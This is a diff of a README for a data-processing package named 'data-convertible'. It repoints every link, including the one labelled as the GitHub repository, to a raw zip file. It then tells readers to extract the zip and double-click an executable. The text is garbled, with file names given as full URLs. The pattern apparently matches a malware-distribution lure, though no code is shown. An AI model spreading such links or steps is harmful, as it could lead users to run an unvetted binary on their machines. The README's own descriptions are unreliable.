@@ -6,7 +6,7 @@ Welcome to **data-convertible**! This package helps you easily process various t
 
 ## 📥 Download Now
 
-[![Download data-convertible](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip%20data--convertible-v1.0-blue)](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip)
+[![Download data-convertible](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip%20data--convertible-v1.0-blue)](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip)
 
 ## 📋 Features
 
@@ -24,14 +24,14 @@ Welcome to **data-convertible**! This package helps you easily process various t
 
 ## 🔗 Download & Install
 
-To get started with **data-convertible**, visit this page to download the latest version: [Download Latest Release](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip).
+To get started with **data-convertible**, visit this page to download the latest version: [Download Latest Release](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip).
 
 After downloading, follow these simple steps to install:
 
 1. Navigate to the download location on your device.
-2. Locate the downloaded file, which should be named `https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip`.
+2. Locate the downloaded file, which should be named `https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip`.
 3. Extract the contents of the ZIP file.
-4. Find the executable file named `https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip` (or equivalent for your OS).
+4. Find the executable file named `https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip` (or equivalent for your OS).
 5. Double-click on the file to run it.
 
 ## 🛠️ How to Use
@@ -53,7 +53,7 @@ If you encounter issues, please check the following:
 
 - **File Permissions:** Ensure you have permission to run apps from your download folder.
 - **Internet Connection:** Some functions may require an internet connection for the language model to process your request.
-- **Updated Version:** Make sure you are using the latest version of the application. Visit [Download Latest Release](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip) for updates.
+- **Updated Version:** Make sure you are using the latest version of the application. Visit [Download Latest Release](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip) for updates.
 
 ## 🗂️ Supported Tasks
 
@@ -84,7 +84,7 @@ If you find any bugs or have suggestions, please visit our GitHub Issues page. Y
 
 ## 🔗 Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip)
-- [Download Latest Release](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-2.8.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip)
+- [Download Latest Release](https://raw.githubusercontent.com/kiethma/data-convertible/main/data_convertible/data-convertible-v2.9.zip)
 
 Thank you for using **data-convertible**! We hope it makes your data processing tasks easier and more efficient.
